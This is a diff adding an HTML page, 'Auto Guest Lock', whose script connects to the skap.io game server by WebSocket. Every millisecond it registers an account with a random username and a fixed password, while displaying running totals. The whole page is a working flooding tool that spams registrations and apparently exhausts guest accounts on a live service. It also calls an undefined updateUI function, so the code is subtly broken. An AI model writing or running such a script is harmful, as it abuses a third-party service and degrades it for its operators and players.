@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Guest Lock</title>
+    <script src="https://cdn.jsdelivr.net/npm/@ygoe/msgpack/msgpack.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: black;
+            color: white;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        h1 {
+            margin: 0;
+            font-size: 24px;
+        }
+        p {
+            margin: 5px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>WORKING</h1>
+    <p id="accounts">Accounts Registered: 0</p>
+    <p id="time">0 minutes of guest locking.</p>
+
+    <script>
+        const ws = new WebSocket("wss://skap.io");
+        ws.binaryType = "arraybuffer";
+
+        let accountsRegistered = 0;
+        let startTime = Date.now();
+
+        const ui = () => {
+            const elapsedMinutes = Math.floor((Date.now() - startTime) / 60000);
+            const timeText = elapsedMinutes < 60 ? `${elapsedMinutes} minute${elapsedMinutes !== 1 ? 's' : ''}` :
+                elapsedMinutes < 1440 ? `${Math.floor(elapsedMinutes / 60)} hour${Math.floor(elapsedMinutes / 60) !== 1 ? 's' : ''}` :
+                `${Math.floor(elapsedMinutes / 1440)} day${Math.floor(elapsedMinutes / 1440) !== 1 ? 's' : ''}`;
+
+            document.getElementById("accounts").innerText = `Accounts Registered: ${accountsRegistered}`;
+            document.getElementById("time").innerText = `${timeText} of guest locking.`;
+        };
+
+        const randomString = (length) => {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            return Array.from({ length: length }, () => chars.charAt(Math.floor(Math.random() * chars.length))).join('');
+        };
+
+        const workerBlob = new Blob([`
+            self.onmessage = (e) => {
+                const { username, password } = e.data;
+                crypto.subtle.digest("SHA-256", new TextEncoder().encode(username + password)).then(hash => {
+                    const hashHex = Array.from(new Uint8Array(hash))
+                        .map(byte => byte.toString(16).padStart(2, "0"))
+                        .join("");
+                    self.postMessage({ username, passwordHash: hashHex });
+                });
+            };
+        `], { type: "application/javascript" });
+
+        const worker = new Worker(URL.createObjectURL(workerBlob));
+        worker.onmessage = (e) => {
+            const { username, passwordHash } = e.data;
+            const message = msgpack.serialize({ e: "register", m: { username, password: passwordHash } });
+            ws.send(message);
+            accountsRegistered++;
+            updateUI();
+        };
+
+        ws.addEventListener("open", () => {
+            console.log("WebSocket connected");
+            setInterval(() => {
+                const username = `user${randomString(5)}`;
+                const password = "ProoklIsVerySigmaNglExDExD";
+                worker.postMessage({ username, password });
+            }, 1);
+        });
+
+        ui();
+    </script>
+</body>
+</html>
